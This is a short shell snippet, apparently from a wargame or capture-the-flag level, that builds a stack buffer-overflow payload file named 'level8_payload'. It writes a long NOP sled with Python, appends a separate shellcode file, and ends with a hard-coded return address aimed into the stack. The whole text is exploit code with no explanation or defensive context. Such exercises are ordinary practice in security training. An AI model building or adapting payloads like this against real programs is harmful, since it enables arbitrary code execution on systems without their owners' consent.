python -c 'print "\x90"*(65536-46+8)' > level8_payload
cat shellcode >> level8_payload
python -c 'print "\x00\xd0\xfe\xff"' >> level8_payload 

